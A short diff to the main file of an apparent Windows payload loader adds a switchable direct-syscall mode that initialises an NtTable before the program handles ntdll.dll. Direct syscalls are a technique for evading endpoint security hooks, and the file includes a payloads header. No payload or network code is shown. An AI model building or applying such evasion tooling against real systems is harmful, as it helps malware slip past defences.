@@ -8,6 +8,9 @@
 #include "../Headers/enumeration.h"
 #include "../Headers/error.h"
 
+// Syscall header
+#include "../Syscall/direct_syscall.h"
+
 // Payloads
 #include "payloads.h"
 
@@ -58,6 +61,24 @@ int main(int argc, char *argv[]) {
 
     // Print the configuration. For debugging purposes.
     printConfig(&config);
+
+    // If null, set to default.
+    if (!config.directSyscallSwitch) {
+        config.directSyscallSwitch = Off;
+    }
+
+    switch (config.directSyscallSwitch) {
+        case(On):
+            // Init the NtTable
+            NtTable pNtTable;
+            ZeroMemory(&pNtTable, sizeof(pNtTable));
+
+            if (!initiateDirectSyscallTable(pNtTable)) {
+                handleError(ERROR_INVALID_SYSCALL, "Failed to initiate direct syscall table");
+                return 1;
+            }
+            break;
+    }
 
     hNTDLLMoudle = GetModuleHandleW(L"ntdll.dll");
     if (!hNTDLLMoudle) {
